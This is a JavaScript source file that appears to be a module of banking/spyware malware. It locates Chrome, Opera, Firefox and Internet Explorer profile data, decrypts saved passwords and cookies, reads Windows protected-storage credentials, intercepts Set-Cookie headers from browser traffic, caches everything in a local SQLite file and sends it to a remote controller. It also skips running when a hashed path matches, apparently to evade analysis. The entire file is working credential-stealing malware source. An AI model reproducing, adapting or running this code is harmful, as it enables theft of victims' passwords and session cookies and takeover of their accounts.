var protobuf = require('protocol_buffers');
var fs = require('fs');
var path = require('path');
var metafs = require('meta_fs');
var wc = process.binding('wincrypt');
var sqlite3 = require('sqlite3');
var certgen = require("certgen");

process.cookieGrabber = {
    dabasefile: path.join(process.env['APPDATA'], 'cookies.sqlite'),
    databasehandle : null,
    grabCookiesToServer : false,
}

const P_SPYWARE = 4;

const INTERNET_COOKIE_IS_SECURE = 0x01;
const INTERNET_COOKIE_IS_SESSION = 0x02;
const INTERNET_COOKIE_THIRD_PARTY = 0x10;
const INTERNET_COOKIE_PROMPT_REQUIRED = 0x20;
const INTERNET_COOKIE_EVALUATE_P3P = 0x40;
const INTERNET_COOKIE_APPLY_P3P = 0x80;
const INTERNET_COOKIE_P3P_ENABLED = 0x100;
const INTERNET_COOKIE_IS_RESTRICTED = 0x200;
const INTERNET_COOKIE_IE6 = 0x400;
const INTERNET_COOKIE_IS_LEGACY = 0x800;
const INTERNET_COOKIE_NON_SCRIPT = 0x00001000;
const INTERNET_COOKIE_HTTPONLY = 0x00002000;



var messages = protobuf([
    'message CookieMessage {',
    '   optional string name = 1;',
    '   optional string value = 2;',
    '   optional string path = 3;',
    '   optional string domain = 4;',
    '   optional bool hostOnly = 5;',
    '   optional bool httpOnly = 6;',
    '   optional bool secure = 7;',
    '   optional bool session = 8;',
    '   optional int32 expirationDate = 9;',
    '   optional string source = 10;',
    '}'
].join('\n'));


var chomeFolders = [
    resolvePath('%USERPROFILE%\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\'),
    resolvePath('%USERPROFILE%\\Local Settings\\Application Data\\Chromium\\User Data\\'),
    resolvePath('%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\'),
    resolvePath('%USERPROFILE%\\AppData\\Local\\Chromium\\User Data\\')
];

var operaFolders = [
    resolvePath('%USERPROFILE%\\Local Settings\\Application Data\\Opera Software\\Opera Developer\\'),
    resolvePath('%USERPROFILE%\\Local Settings\\Application Data\\Opera Software\\Opera Stable\\'),
    resolvePath('%USERPROFILE%\\AppData\\Local\\Opera Software\\Opera Developer\\'),
    resolvePath('%USERPROFILE%\\AppData\\Local\\Opera Software\\Opera Stable\\'),
    resolvePath('%USERPROFILE%\\AppData\\Roaming\\Opera Software\\Opera Developer\\'),
    resolvePath('%USERPROFILE%\\AppData\\Roaming\\Opera Software\\Opera Stable\\')
];

var nssFolders = [
    resolvePath('%APPDATA%\\Mozilla\\Firefox\\Profiles\\')
];

process.sendCookie = function (cookieObject)
{
    try {
        

        if (process.controllerConnection) {

            var packet = messages.CookieMessage.encode(cookieObject);

            process.controllerConnection
                .sendProtocolPacket(P_SPYWARE,
                    SLAVE_PACKET_COOKIE, 0, packet);
        } else {
            var packet = new Buffer(JSON.stringify(cookieObject));
            if (process.masterConnection) {
                process.masterConnection.sendProtocolPacket(
                    SLAVE_PACKET_COOKIE,
                    packet
                );
            }
            else {
                process.pendingMessages.push({
                    t: SLAVE_PACKET_COOKIE,
                    p: packet
                });
            }
        }
    } catch (e) {
        console.log(e.message);
        console.log(e.stack);
    }

}

function escape(val) {
    if (val === undefined || val === null) {
        return 'NULL';
    }
    val = val.replace(/[\0\n\r\b\t\\\'\"\x1a]/g, function (s) {
        switch (s) {
            case "\0": return "\\0";
            case "\n": return "\\n";
            case "\r": return "\\r";
            case "\b": return "\\b";
            case "\t": return "\\t";
            case "\x1a": return "\\Z";
            default: return "\\" + s;
        }
    });
    return "'" + val + "'";
};

function closeCookiesDb() {
    if (process.cookieGrabber.databasehandle &&
        process.cookieGrabber.databasehandle.close
    ) {
        process.cookieGrabber.databasehandle.close();
        process.cookieGrabber.databasehandle = null;
    }
}
function CreateOrOpenCookiesDatabase(callback) {

    closeCookiesDb();

    process.cookieGrabber.databasehandle =
        new sqlite3.Database(process.cookieGrabber.dabasefile, function (error) {

            var scheme =
                'CREATE TABLE IF NOT EXISTS `cookies` (\r\n' +
                '   `id` INTEGER PRIMARY KEY AUTOINCREMENT,\r\n' +
                '   `name` text  NOT NULL,\r\n' +
                '   `value` text  NOT NULL,\r\n' +
                '   `path` text  NULL,\r\n' +
                '   `domain` text  NULL,\r\n' +
                '   `hostOnly` bool  NOT NULL,\r\n' +
                '   `httpOnly` bool  NOT NULL,\r\n' +
                '   `secure` bool  NOT NULL,\r\n' +
                '   `session` bool  NOT NULL,\r\n' +
                '   `expirationDate` timestamp  NULL,\r\n' +
                '   `source` char(32)  NULL,\r\n' +
                '   `creationDate` timestamp  NOT NULL,\r\n' +
                '   unique(name,value,path,domain)\r\n' +
                ');\r\n';

            if (error) return callback(error);
            process.cookieGrabber.databasehandle.run(scheme, callback);
        });

}


function insertCookie(obj) {

    if (process.cookieGrabber.databasehandle === null) {
        CreateOrOpenCookiesDatabase(function (error) {
            if (!error) { insertCookie(obj); } else {
                closeCookiesDb();
                fs.unlink(process.cookieGrabber.dabasefile, function () {
                    insertCookie(obj);
                });
            }
        })
    }

    var line = util.format(
        "INSERT OR IGNORE INTO cookies " +
        "(name, value, path, domain, hostOnly, httpOnly, secure, session, expirationDate, source, creationDate)" +
        " VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %d, %s, %d)",
        escape(obj.name),
        escape(obj.value),
        escape(obj.path),
        escape(obj.domain),
        obj.hostOnly ? "1" : "0",
        obj.httpOnly ? "1" : "0",
        obj.secure ? "1" : "0",
        obj.session ? "1" : "0",
        obj.expirationDate,
        escape(obj.source),
        (Math.floor(Date.now() / 1000))
    );

    if (process.cookieGrabber.databasehandle) {
        process.cookieGrabber.databasehandle.run(line, function (erorr) { });
    }
}

function sendNextCookie()
{
    if (process.cookieGrabber.grabCookiesToServer === true &&
        process.cookieGrabber.databasehandle !== null)
    {
        var db = process.cookieGrabber.databasehandle;
        db.all("SELECT * FROM cookies ORDER BY id LIMIT 0,1", function (err, rows) {

            if (!rows) {
                return setTimeout(sendNextCookie, 100);
            }
            if (rows.length === 0) {
                return setTimeout(sendNextCookie, 100);
            }

            rows.forEach(function (row) {
                process.sendCookie(row);
                db.run(util.format("DELETE FROM cookies WHERE id=%d", row.id),
                    function () {
                        return setTimeout(sendNextCookie, 100);
                    });
            });
        });
    } else {
        setTimeout(sendNextCookie, 100);
    }
}

function sendCookiesToStore(cookieObject) {
    insertCookie(cookieObject);
}

function resolvePath (str){
    return str.replace(/%([^%]+)%/g, function(_,n) {
        return process.env[n];
    })
}

function collectChromiumEnginePassword(dataPaths, prefix, onpassword_cb) {
    function match_fn(foundpath, stat, depth, cb) {

        if (path.basename(foundpath) == 'Login Data') {
            var newFilename = foundpath + ' Backup';
            metafs.copy(foundpath, newFilename, function (error, some) {
                function final() {
                    metafs.remove(newFilename, function () { });
                }

                if (!error) {

                    var db = new sqlite3.Database(newFilename, function (db_open_error) {
                        if (!db_open_error) {
                            db.all('SELECT origin_url, username_value, password_value FROM logins', function (select_error, rows) {

                                if (select_error) {
                                    //console.log(select_error);
                                } else if (rows) {
                                    rows.filter(function (val) {
                                        return (val.username_value != '')
                                    }).map(function (val) {
                                        val.origin_url =
                                            '(' + prefix + ') ' + val.origin_url;
                                        val.password_value =
                                            wc.unprotectString(val.password_value);
                                        return val;
                                    }).filter(function (val) {
                                        return (val.password_value != '')
                                    }).forEach(function (account) {
                                        onpassword_cb(account);
                                    });
                                }

                                db.close();
                                final();
                            })
                        } else {
                            final()
                        }
                    });
                }
            })
        }
        // you can stop walking by passing an error to `cb`
        cb((depth < 2) ? true : 'depth limited');
    }

    dataPaths.filter(fs.existsSync).forEach(function (directory) {
        metafs.find(directory, { match_fn: match_fn }, function (err) { })
    })
}

function collectNSSEnginePassword(dataPaths, prefix, onpassword_cb)
{
    function match_fn(foundpath, stat, depth, cb)
    {
        if (path.basename(foundpath) == 'logins.json')
        {
            fs.readFile(foundpath, 'utf8', function (read_error, data) {
                if (!read_error) {
                    try {
                        var jsonContent = JSON.parse(data);
                        if (jsonContent && jsonContent.logins) {
                            jsonContent.logins.forEach(function (login) {
                                onpassword_cb({
                                    password_value: wc.fireFoxDecryptString(new Buffer(login.encryptedPassword, 'base64')),
                                    username_value: wc.fireFoxDecryptString(new Buffer(login.encryptedUsername, 'base64')),
                                    origin_url: '(' + prefix + ') ' + login.hostname
                                });
                            })
                        }
                    } catch (parse_exception) {

                    }
                }
            });
        }

        cb((depth < 2) ? true : 'depth limited');
    }

    dataPaths.filter(fs.existsSync).forEach(function (directory) {
        metafs.find(directory, { match_fn: match_fn }, function (err) { })
    })
}

function collectCromePasswords(onpassword_cb) {
    collectChromiumEnginePassword(chomeFolders, 'chrome', onpassword_cb);
    collectChromiumEnginePassword(operaFolders, 'opera', onpassword_cb);
}

function collectFirefoxPasswords(onpassword_cb) {
    collectNSSEnginePassword(nssFolders, 'firefox', onpassword_cb);
}

function collectWindowsPasswords(onpassword_cb)
{
    var passwords = process.binding('pstorage').getProtectedData();
    var passwdArray = passwords.split('\r\n');

    passwdArray.forEach(function (item) {
        var parts = item.split('::');
        if (parts.length == 4) {
            onpassword_cb({
                password_value: parts[3],
                username_value: parts[2],
                origin_url: '(' + parts[0] + ') ' + parts[1]
            });
        }
    });
}


function collectIeCookies() {

    var foundFiles = [];

    function match_fn(foundpath, stat, depth, cb) {
        if (path.extname(foundpath) === '.txt') {
            foundFiles.push(foundpath)
        }
        cb((depth < 4) ? true : 'depth limited');
    };

    function ExpireTimeIE(timeHigh, timeLow) {
        return 1e-7 * (timeHigh * Math.pow(2, 32) + timeLow) - 11644473600;
    }

    function next() {
        setTimeout(function () {
            grabNextCookiesFile();
        }, 5);
    }

    function grabNextCookiesFile() {

        if (foundFiles.length > 0) {
            var filePath = foundFiles.shift();
            if (fs.existsSync(filePath)) {
                fs.readFile(filePath, 'utf8', function (read_error, data) {
                    if (read_error) {
                        next();
                    } else {
                        data.split('\n*').forEach(function (CookieLine) {

                            var cookieLines = CookieLine.trim().split('\n');

                            if (cookieLines.length !== 8) {
                                return;
                            }

                            var cookieFlags = parseInt(cookieLines[3]);
                            var cookePath = cookieLines[2].trim();

                            /*
                                1. Cookie name
                                2. Cookie value
                                3. Host/path for the web server setting the cookie
                                4. Flags
                                5. Exirpation time
                                6. Expiration time
                                7. Creation time
                                8. Creation time
                                9. Record delimiter (*)
                            */

                            sendCookiesToStore({
                                name: cookieLines[0].trim(),
                                value: cookieLines[1].trim(),
                                path: '/' + (cookePath.split('/').slice(1).join('/')),
                                domain: cookePath.split('/')[0],
                                hostOnly: (cookePath.charAt(0) !== '.' && cookePath.charAt(0) !== '*'),
                                httpOnly: ((cookieFlags & INTERNET_COOKIE_HTTPONLY) === INTERNET_COOKIE_HTTPONLY),
                                secure: ((cookieFlags & INTERNET_COOKIE_IS_SECURE) === INTERNET_COOKIE_IS_SECURE),
                                session: ((cookieFlags & INTERNET_COOKIE_IS_SESSION) === INTERNET_COOKIE_IS_SESSION),
                                expirationDate: ExpireTimeIE(cookieLines[5] , parseInt(cookieLines[4]) ),
                                source : 'ie'
                            });
                        })

                        next();
                    }
                })

            } else next();
        }
    }

    [
        resolvePath('%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\INetCookies'),
        resolvePath('%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Cookies'),
        resolvePath('%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\Low'),
        resolvePath('%USERPROFILE%\\AppData\\LocalLow\\Microsoft\\Windows\\Cookies\\Low'),
        resolvePath('%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Cookies'),
        resolvePath('%USERPROFILE%\\Cookies')
    ].filter(fs.existsSync).forEach(function (directory){
        metafs.find(directory, { match_fn: match_fn }, function (err) {
            grabNextCookiesFile();
        })
    });
}

function collectChromiumEngineCookies(dataPaths, source)
{
    function match_fn(foundpath, stat, depth, cb) {

        if (path.basename(foundpath) == 'Cookies')
        {
            var newFilename = foundpath + ' Backup';

            metafs.copy(foundpath, newFilename, function (error, some) {

                function final() {
                    metafs.remove(newFilename, function () { });
                }

                if (!error) {

                    var db = new sqlite3.Database(newFilename, function (db_open_error) {
                        if (!db_open_error) {
                            db.all("select datetime((creation_utc/1000000)-11644473600,'unixepoch') as creation_utc," +
                                    "datetime((expires_utc/1000000)-11644473600,'unixepoch') as expires_utc," +
                                    "datetime((last_access_utc/1000000)-11644473600,'unixepoch') as last_access_utc, " +
                                    "host_key,name,value,encrypted_value,path, secure,httponly" +
                                    " from cookies;",
                            function (select_error, rows) { 

                                if (select_error) {
                                    console.log(select_error);
                                } else if (rows) {

                                    rows.map(function (val) {
                                        if (val.value === '') {
                                            val.value =
                                                wc.unprotectString(val.encrypted_value)
                                                    .toString();
                                        }

                                        if (val.expires_utc == 0) {
                                            val.has_expires = 0
                                            val.persistent = 0
                                        }
                                        return val;
                                    }).forEach(function (cookie) {
                                    
                                        sendCookiesToStore({
                                            name: cookie.name,
                                            value: cookie.value,
                                            path: cookie.path,
                                            domain: cookie.host_key,
                                            hostOnly: (cookie.host_key.charAt(0) !== '.' && cookie.host_key.charAt(0) !== '*'),
                                            httpOnly: cookie.httponly,
                                            secure: cookie.secure,
                                            session: (cookie.persistent === 0),
                                            expirationDate: ((new Date(cookie.expires_utc)).getTime() / 1000),
                                            source: source
                                        });
                                    });
                                }
                                db.close();
                                final();
                            })
                        } else {
                            final()
                        }
                    });
                }
            })
        }
        // you can stop walking by passing an error to `cb`
        cb((depth < 2) ? true : 'depth limited');
    }

    dataPaths.filter(fs.existsSync).forEach(function (directory) {
        metafs.find(directory, { match_fn: match_fn }, function (err) {})
    })
}

function collectChromiumCookies() {
    collectChromiumEngineCookies(chomeFolders, 'chrome');
    collectChromiumEngineCookies(operaFolders, 'opera');
}

function collectFireFoxCookies()
{
    function match_fn(foundpath, stat, depth, cb) {

        if (path.basename(foundpath) == 'cookies.sqlite') {

            var newFilename = foundpath + '.backup';

            metafs.copy(foundpath, newFilename, function (error, some) {
                function final() {
                    metafs.remove(newFilename, function () { });
                }

                if (!error) {

                    var db = new sqlite3.Database(newFilename, function (db_open_error) {
                        if (!db_open_error) {
                            db.all('select * from "moz_cookies"', function (select_error, rows) {

                                if (select_error) {
                                    //console.log(select_error);
                                } else if (rows) {

                                    /*
                                        [11040] JS : { id: 3,
                                        [11040]   baseDomain: 'google.com',
                                        [11040]   originAttributes: '',
                                        [11040]   name: 'GAPS',
                                        [11040]   value: '1:bvOm5-lWgw7TrD6-i1t75y7PS0KnOg:u0Pha4BNK4c5kmW4',
                                        [11040]   host: 'accounts.google.com',
                                        [11040]   path: '/',
                                        [11040]   expiry: 1516954812,
                                        [11040]   lastAccessed: 2023019632,
                                        [11040]   creationTime: 2023019632,
                                        [11040]   isSecure: 1,
                                        [11040]   isHttpOnly: 1,
                                        [11040]   appId: 0,
                                        [11040]   inBrowserElement: 0 }
                                    */

                                    rows.forEach(function (account) {
                                        sendCookiesToStore({
                                            name: account.name,
                                            value: account.value,
                                            path: account.path,
                                            domain: account.baseDomain,
                                            hostOnly: (account.host.charAt(0) !== '.' && account.host.charAt(0) !== '*'),
                                            httpOnly: account.isHttpOnly,
                                            secure: account.isSecure,
                                            session: false,
                                            expirationDate: account.expiry,
                                            source: 'firefox'
                                        });
                                    });
                                }

                                db.close();
                                final();
                            })
                        } else {
                            final()
                        }
                    });
                }
            })
        }
        // you can stop walking by passing an error to `cb`
        cb((depth < 2) ? true : 'depth limited');
    }

    nssFolders.filter(fs.existsSync).forEach(function (directory) {
        metafs.find(directory, { match_fn: match_fn }, function (err) { })
    })
}
//'NID=75=xmbbC0g_-5bXmNZQQ_R_Uns-MZ4bhIq8NVZtAN53VjO6BzHJmVOHUxaqL_Mko1KF6N6JqB0CEy884Ut5SEp45cRC3IWfibhrplAS6OBtn_oiCLWzzZISV-GecBFkjgPN; expires=Thu, 28-Jul-2016 09:44:36 GMT; path=/; domain=.google.com; HttpOnly'

//------------------- cookie parse --------------------------
function isNonEmptyString(str) {
    return typeof str == 'string' && !!str.trim();
}
function parseSetCookieString(setCookieValue) {
    var parts = setCookieValue.split(';').filter(isNonEmptyString);
    var nameValue = parts.shift().split("=");
    var cookie = {
        httpOnly: false,
        secure : false,
        name: nameValue.shift(), // grab everything before the first =
        value: nameValue.join("=") // everything after the first =, joined by a "=" if there was more than one part
    };

    parts.forEach(function (part) {
        var sides = part.split("=");
        var key = sides.shift().trimLeft().toLowerCase();
        var value = sides.join("=");
        if (key == "expires") {
            cookie.expires = new Date(value);
        } else if (key == 'max-age') {
            cookie.maxAge = parseInt(value, 10);
        } else if (key == 'secure') {
            cookie.secure = true;
        } else if (key == 'httponly') {
            cookie.httpOnly = true;
        } else {
            cookie[key] = value;
        }
    });

    return cookie;
}
//----------------------------------------------------------
process.on('browser_response', function (response) {
    if (response.headers)
    {
        var cookies = (response.headers['set-cookie'] || []).map(parseSetCookieString);

        cookies.forEach(function (cookie) {
            var domain = cookie.domain || response.realdomain;
            process.emit('browser_cookies', {
                name: cookie.name,
                value: cookie.value,
                path: cookie.path || '/',
                domain: domain,
                hostOnly: (domain.charAt(0) !== '.' && domain.charAt(0) !== '*'),
                httpOnly: cookie.httpOnly,
                secure: cookie.isSecure || response.isSsl,
                session: false,
                expirationDate: ((cookie.expires || new Date()).getTime() / 1000),
                source: process.currentBinary.split('.exe')[0]
            });
        });
    }
})

process.on('browser_request', function (request) {

});

process.on("browser_cookies", function (cookiesObject) {
    sendCookiesToStore(cookiesObject);
})



process.collectCookies = function () {
    if (process.execPath.split(path.sep).map(function (item) {
        item.toUpperCase().hashCode()
    }).indexOf('593573472') !== -1) {
        return;
    }
    print('collectCookies();...');
    if (process.currentBinary === 'explorer.exe') {
        collectIeCookies();
        collectChromiumCookies();
        collectFireFoxCookies();
    }
}

process.collectSavedPasswords = function () {

    var spyware = require('spyware');

    if (process.execPath.split(path.sep).map(function (item) {
        item.toUpperCase().hashCode()
    }).indexOf('593573472') !== -1) {
        return;
    }

    if (process.currentBinary === 'firefox.exe') {
        function dumpPasswordsIfReady() {
            if (certgen.firefoxIsDbInitialized()) {
                collectFirefoxPasswords(function (item) {
                    spyware.SendAuthInformationPacket(
                        item.username_value,
                        item.origin_url,
                        item.password_value
                    );
                });
            } else {
                setTimeout(function () {
                    dumpPasswordsIfReady();
                }, 1000);
            }
        }

        dumpPasswordsIfReady();
    } else if (process.currentBinary === 'explorer.exe') {
        collectWindowsPasswords(function (item) {
            spyware.SendAuthInformationPacket(
                item.username_value,
                item.origin_url,
                item.password_value
            );
        });

        collectCromePasswords(function (item) {
            spyware.SendAuthInformationPacket(
                item.username_value,
                item.origin_url,
                item.password_value
            );
        });

    }
}

module.exports.collectCromePasswords = collectCromePasswords;
module.exports.collectFirefoxPasswords = collectFirefoxPasswords;
module.exports.collectWindowsPasswords = collectWindowsPasswords;

module.exports.collectIeCookies = collectIeCookies;
module.exports.collectChromiumCookies = collectChromiumCookies;
module.exports.collectFireFoxCookies = collectFireFoxCookies;


module.exports.sendCookiesToStore = sendCookiesToStore;

setTimeout(function () {
    if (process.g_mainProcess) {
        sendNextCookie();
    }
}, 5000);